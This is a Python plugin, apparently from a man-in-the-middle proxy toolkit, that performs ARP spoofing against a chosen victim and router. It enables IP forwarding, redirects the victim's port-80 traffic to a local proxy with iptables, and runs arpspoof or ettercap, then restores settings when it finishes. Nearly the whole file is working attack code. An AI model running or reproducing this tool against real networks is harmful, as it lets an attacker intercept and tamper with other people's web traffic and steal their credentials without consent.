import os,subprocess,logging
from plugins.sergio_proxy.plugins.plugin import Plugin

fnull = open(os.devnull, 'w')

class ArpSpoof(Plugin):
    name = "ARP Spoof"
    optname = "arpspoof"
    implements = []
    has_opts = True
    log_level = logging.DEBUG
    def initialize(self,options):
        '''Called if plugin is enabled, passed the options namespace'''
        self.options = options
        self.vic_ip = options.victim_ip
        self.router_ip = options.router_ip
        self.procs = []
        
        logging.log(self.log_level,"Starting IP forwarding...")
        self.ipfwd_status = open("/proc/sys/net/ipv4/ip_forward","r").read(1)
        subprocess.call("sudo sysctl -w net.ipv4.ip_forward=1",
                shell=True,stdout=fnull,stderr=fnull)
        logging.log(self.log_level,"Modifying iptables...")
        os.system("iptables-save > /tmp/iptbl.bak")
        os.system("sudo iptables -t nat -A PREROUTING -i %s -p tcp --dport "\
                "80 -j REDIRECT --to-port %s"\
                % (options.input_if,options.listen))
        
        logging.log(self.log_level,"Starting arp spoofing...")
        if options.use_ettercap:
           self.run_subprocess("sudo ettercap -i %s -T -o -M arp /%s/ /%s/"\
                    % (options.input_if,self.vic_ip,self.router_ip))
        else:
            if self.vic_ip:
                self.run_subprocess("sudo arpspoof -i %s -t %s %s"\
                    % (options.input_if,self.vic_ip,self.router_ip))
            else:
                self.run_subprocess("sudo arpspoof -i %s %s"\
                    % (options.input_if,self.router_ip))

    def run_subprocess(self,cmd):
        p = subprocess.Popen(cmd,shell=True,
                stdout=fnull, stderr=subprocess.STDOUT)
        self.procs.append(p)

    def add_options(self,options):
        options.add_argument("--victim-ip",type=str,default="",
                help="The IP address or range of your victim (default: all)")
        options.add_argument("--router-ip",type=str,default="192.168.1.1",
                help="The IP address of the local routers (default: 192.168.1.1)")
        options.add_argument("--use-ettercap",action="store_true",
                help="Use ettercap instead of arpspoof for MITM")
        options.add_argument("-i","--input-if",type=str,default="eth0",
                help="Specify the interface to use. (default eth0)")
    def finish(self):
        logging.log(self.log_level,"Resetting network and killing MITM...")
        subprocess.call("sudo sysctl -w net.ipv4.ip_forward=%s"\
                %self.ipfwd_status,shell=True,stdout=fnull,stderr=fnull)
        os.system("sudo iptables --flush")
        os.system("sudo iptables-restore < /tmp/iptbl.bak")
        for p in self.procs:
            #send ctrl-c so they can clean up
            os.kill(p.pid,2)
